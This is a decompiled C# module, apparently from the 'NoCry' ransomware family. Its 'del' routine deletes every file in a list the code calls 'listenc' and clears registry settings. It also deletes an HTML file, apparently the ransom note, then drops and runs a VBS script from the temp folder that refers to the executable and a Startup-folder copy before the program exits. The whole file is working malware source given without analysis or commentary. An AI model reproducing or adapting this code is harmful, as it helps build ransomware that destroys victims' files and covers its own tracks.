using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My.Resources;

namespace NoCry;

[StandardModule]
internal sealed class del
{
	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	public static void del()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string current = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000b;
				case 698:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0033;
						case 5:
						case 6:
							goto IL_003f;
						case 7:
							goto IL_004e;
						case 8:
							goto IL_005e;
						case 9:
							goto IL_007a;
						case 10:
							goto IL_0097;
						case 11:
							goto IL_00b4;
						case 12:
							goto IL_00d1;
						case 13:
							goto IL_00ee;
						case 14:
							goto IL_010b;
						case 15:
							goto IL_0128;
						case 16:
							goto IL_0145;
						case 17:
							goto IL_0162;
						case 18:
							goto IL_017f;
						case 19:
							goto IL_0192;
						case 20:
						case 21:
							goto IL_01a2;
						case 22:
							goto IL_01ab;
						case 23:
							goto IL_01bf;
						case 24:
							goto IL_01d3;
						case 25:
							goto IL_01fc;
						case 26:
							goto IL_0209;
						case 27:
							goto IL_0215;
						case 28:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 29:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_003f:
					num = 6;
					goto IL_0041;
					IL_0024:
					num = 3;
					if (File.Exists(current))
					{
						goto IL_0033;
					}
					goto IL_003f;
					IL_0215:
					num = 27;
					streamWriter.Close();
					break;
					IL_0033:
					num = 4;
					File.Delete(current);
					goto IL_003f;
					IL_000b:
					num = 2;
					enumerator = Form4.listenc.GetEnumerator();
					goto IL_0041;
					IL_0041:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0024;
					}
					goto IL_004e;
					IL_004e:
					num = 7;
					((IDisposable)enumerator).Dispose();
					goto IL_005e;
					IL_005e:
					num = 8;
					Interaction.SaveSetting("P", "0", St.Setting, "");
					goto IL_007a;
					IL_007a:
					num = 9;
					Interaction.SaveSetting("H", "0", St.Setting, "");
					goto IL_0097;
					IL_0097:
					num = 10;
					Interaction.SaveSetting("M", "0", St.Setting, "");
					goto IL_00b4;
					IL_00b4:
					num = 11;
					Interaction.SaveSetting("S", "0", St.Setting, "");
					goto IL_00d1;
					IL_00d1:
					num = 12;
					Interaction.SaveSetting("X", "0", St.Setting, "");
					goto IL_00ee;
					IL_00ee:
					num = 13;
					Interaction.SaveSetting("D", "0", St.Setting, "");
					goto IL_010b;
					IL_010b:
					num = 14;
					Interaction.SaveSetting("T", "0", St.Setting, "");
					goto IL_0128;
					IL_0128:
					num = 15;
					Interaction.SaveSetting("G", "0", St.Setting, "");
					goto IL_0145;
					IL_0145:
					num = 16;
					Interaction.SaveSetting("F", "0", St.Setting, "");
					goto IL_0162;
					IL_0162:
					num = 17;
					Interaction.SaveSetting("C", "0", St.Setting, "");
					goto IL_017f;
					IL_017f:
					num = 18;
					if (File.Exists(St.html))
					{
						goto IL_0192;
					}
					goto IL_01a2;
					IL_0192:
					num = 19;
					File.Delete(St.html);
					goto IL_01a2;
					IL_01a2:
					num = 21;
					text = Resources.del;
					goto IL_01ab;
					IL_01ab:
					num = 22;
					text2 = Path.GetTempPath() + "del.vbs";
					goto IL_01bf;
					IL_01bf:
					num = 23;
					text = text.Replace("%path%", Application.get_ExecutablePath());
					goto IL_01d3;
					IL_01d3:
					num = 24;
					text = text.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + St.mute + ".exe");
					goto IL_01fc;
					IL_01fc:
					num = 25;
					streamWriter = new StreamWriter(text2, append: false);
					goto IL_0209;
					IL_0209:
					num = 26;
					streamWriter.WriteLine(text);
					goto IL_0215;
					end_IL_0001_2:
					break;
				}
				num = 28;
				Process.Start(text2);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 698;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
